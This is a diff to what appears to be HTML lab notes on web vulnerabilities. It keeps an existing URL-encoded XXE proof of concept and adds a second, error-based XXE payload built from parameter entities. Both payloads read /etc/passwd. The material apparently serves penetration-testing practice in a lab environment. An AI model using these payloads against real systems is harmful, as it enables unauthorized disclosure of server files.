@@ -10,6 +10,13 @@
 PoC (with URL encoded):<br/>
 http://[yourlab]/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E<br/>
 <br/>
+<b>Another:</b><br/>
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;<br/>
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;<br/>
+%eval;<br/>
+%error;<br/>
+<br/>
+<br/>
 <b>Traversing XPATH</b><br/>
 It’s possible to get an idea of what the XPath expression looks like:<br/>
 <br/>
